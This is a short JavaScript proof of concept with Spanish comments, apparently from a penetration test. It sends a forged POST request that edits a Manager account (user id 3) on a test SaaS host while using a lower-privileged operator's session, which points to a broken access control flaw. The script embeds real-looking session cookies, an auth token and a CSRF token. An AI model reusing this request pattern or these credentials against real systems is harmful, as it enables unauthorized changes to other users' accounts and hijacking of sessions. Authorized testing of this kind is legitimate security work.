// Crear una nueva instancia de XMLHttpRequest
var xhr = new XMLHttpRequest();

// Configurar la petición con el método POST y la URL adecuada
xhr.open("POST", "https://bp-saas-tst.sin-cola.com/user_admin/edit_user_ajax", true);

// Configurar las cabeceras necesarias
xhr.setRequestHeader("Cookie", "_web_session=eyJzZXNzaW9uX2lkIjoiYzEwZTc1Nzc4NmZjM2VmMTIwOWMxZTkwODU1NzRhZTAiLCJmb3JtIjp7fSwiX2NzcmZfdG9rZW4iOiJoKzFYK2s4K2YvWEwrdUlhVHVNNlkrNEN1cFcwaTBuYWNTUDJsN2VLajZvPSIsInVzZXJfZW1haWwiOiJicnVubytvcGVyYWRvcjFAaGFja2VtdHJpeC5jb20iLCJjbGllbnRfc2V0dGluZ3MiOlt7InNldHRpbmdfY2xpZW50X29wZXJhdG9yIjp7ImlkIjozLCJjbGllbnRfaWQiOjEsIm9wZXJhdG9yX2lkIjpudWxsLCJuYW1lIjoiaGlkZV9vcGVyYXRlZF9nYXRlc192aWV3IiwidmFsdWUiOiJmYWxzZSIsImRlc2NyaXB0aW9uIjpudWxsfX0seyJzZXR0aW5nX2NsaWVudF9vcGVyYXRvciI6eyJpZCI6NCwiY2xpZW50X2lkIjoxLCJvcGVyYXRvcl9pZCI6bnVsbCwibmFtZSI6ImhpZGVfbXlfc2VydmljZV9wcm92aWRlcl92aWV3IiwidmFsdWUiOiJmYWxzZSIsImRlc2NyaXB0aW9uIjpudWxsfX0seyJzZXR0aW5nX2NsaWVudF9vcGVyYXRvciI6eyJpZCI6NSwiY2xpZW50X2lkIjoxLCJvcGVyYXRvcl9pZCI6bnVsbCwibmFtZSI6ImhpZGVfbXlfbGluZXNfdmlldyIsInZhbHVlIjoiZmFsc2UiLCJkZXNjcmlwdGlvbiI6bnVsbH19LHsic2V0dGluZ19jbGllbnRfb3BlcmF0b3IiOnsiaWQiOjYsImNsaWVudF9pZCI6MSwib3BlcmF0b3JfaWQiOm51bGwsIm5hbWUiOiJoaWRlX215X2F0dGVuZGVkX3RpY2tldHNfdmlldyIsInZhbHVlIjoiZmFsc2UiLCJkZXNjcmlwdGlvbiI6bnVsbH19LHsic2V0dGluZ19jbGllbnRfb3BlcmF0b3IiOnsiaWQiOjcsImNsaWVudF9pZCI6MSwib3BlcmF0b3JfaWQiOm51bGwsIm5hbWUiOiJoaWRlX215X2FwcG9pbnRtZW50c192aWV3IiwidmFsdWUiOiJmYWxzZSIsImRlc2NyaXB0aW9uIjpudWxsfX1dLCJzaG93X3NlbGZfYXR0ZW50aW9uX3RpY2tldF9zd2l0Y2giOmZhbHNlLCJwYXNzd29yZF92YWxpZGl0eSI6dHJ1ZSwiZXh0ZXJuYWxfbG9naW4iOmZhbHNlLCJhdXRoX3Rva2VuIjoiR0tlWG9oQ2hIdzFyYTdwamtIek4iLCJ1c2VyX2RhdGEiOnsidXNlciI6eyJpZCI6Mzc1MywiZmlyc3RfbmFtZSI6IkJydW5vIiwibGFzdF9uYW1lIjoib3BlcmFkb3JUZXN0IiwiZW1haWwiOiJicnVubytvcGVyYWRvcjFAaGFja2VtdHJpeC5jb20iLCJhZGRyZXNzIjpudWxsLCJwaG9uZV9udW1iZXIiOm51bGwsIm5pY2tuYW1lIjpudWxsLCJ0eXBlIjoiT3BlcmF0b3IiLCJ0aW1lX3pvbmUiOiJBbWVyaWNhL0NhcmFjYXMiLCJhY3RpdmUiOnRydWUsImxhc3RfcGFzc3dvcmRfY2hhbmdlIjoiMjAyNC0wNS0xNlQxNzowNToyMloifX0sImN1cnJlbnRfcm9sZSI6Im9wZXJhdG9yIiwic2V0dGluZ19jbGllbnRfaWQiOjEsInNldHRpbmdfb3BlcmF0b3JfaWQiOjM3NTMsIm9wZXJhdG9yX3NldHRpbmdzIjpbXSwibWFuYWdlcl9vcGVyYXRvciI6ZmFsc2UsInNlbGVjdGVkX2dhdGVfaWQiOiIxIn0%3D--366a9f5487f4723378257590330a4afeee7384d0; TawkConnectionTime=0; twk_idm_key=Au5TX2ooa7-iGVXGsjS9j; cross_domain_id=pHZzjbILDI3N4F9g7AAjzcOTLoxOfW6vl14vrYs0h2P5TM8w3uiI1yRMb1CiNPe0--cg%2BLhfUI0GT1rCG5GDW0Pw%3D%3D--a9%2BTmdeuGUYi2pVY26Oq1w%3D%3D");
xhr.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0");
xhr.setRequestHeader("Accept", "*/*");
xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
xhr.setRequestHeader("Accept-Encoding", "gzip, deflate, br");
xhr.setRequestHeader("Referer", "https://bp-saas-tst.sin-cola.com/");
xhr.setRequestHeader("X-Newrelic-Id", "UAUFV1BbDRABVFNQBwYAUlED");
xhr.setRequestHeader("Newrelic", "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQzMjY2ODUiLCJhcCI6IjExMzQ0NTgzODUiLCJpZCI6IjgyYWQ0Mjg2NzViYzU4MjMiLCJ0ciI6IjU3MzBlZWUzNThiMTMzN2Q4Y2IyODI2YzFlNGEyMWMxIiwidGkiOjE3MTU4ODYwMzcxNzd9fQ==");
xhr.setRequestHeader("Traceparent", "00-5730eee358b1337d8cb2826c1e4a21c1-82ad428675bc5823-01");
xhr.setRequestHeader("Tracestate", "4326685@nr=0-1-4326685-1134458385-82ad428675bc5823----1715886037177");
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
xhr.setRequestHeader("X-Csrf-Token", "muFawosI/PT5AKa6xEvvzf/Q4v+DmLtW+howkUH+VfcdDA04xDaDATL6RKCKqNWuEdJYajcT8oyLOcYG9nTaXQ==");
xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
xhr.setRequestHeader("Origin", "https://bp-saas-tst.sin-cola.com");
xhr.setRequestHeader("Sec-Fetch-Dest", "empty");
xhr.setRequestHeader("Sec-Fetch-Mode", "cors");
xhr.setRequestHeader("Sec-Fetch-Site", "same-origin");
xhr.setRequestHeader("Te", "trailers");
xhr.setRequestHeader("Connection", "close");
xhr.setRequestHeader("Hackmetrix-Pentest", "true");

// Preparar los datos del formulario
var params = "utf8=%E2%9C%93&%2Fuser_admin%2Fedit_user_ajax%5Bfirst_name%5D=Manager&%2Fuser_admin%2Fedit_user_ajax%5Bid%5D=3&%2Fuser_admin%2Fedit_user_ajax%5Blast_name%5D=Sede+Principal&%2Fuser_admin%2Fedit_user_ajax%5Bdocument_number%5D=&original_document_number=&%2Fuser_admin%2Fedit_user_ajax%5Bemail%5D=manager-ppal@sin-cola.com&original_email=&%2Fuser_admin%2Fedit_user_ajax%5Bphone_number%5D=&%2Fuser_admin%2Fedit_user_ajax%5Baddress%5D=&%2Fuser_admin%2Fedit_user_ajax%5Bnickname%5D=&%2Fuser_admin%2Fedit_user_ajax%5Bactive%5D=true&%2Fuser_admin%2Fedit_user_ajax%5Btype%5D=Manager&branches%5B%5D=1&%2Fuser_admin%2Fedit_user_ajax%5Bhierarchy%5D=&%2Fuser_admin%2Fedit_user_ajax%5Bdivision%5D=";

// Asignar una función de callback para manejar la respuesta
xhr.onreadystatechange = function() {
  if (xhr.readyState === XMLHttpRequest.DONE) {
    if (xhr.status === 200) {
      console.log("Response received: ", xhr.responseText);
    } else {
      console.error("Error: ", xhr.statusText);
    }
  }
};

// Enviar la petición con los datos
xhr.send(params);
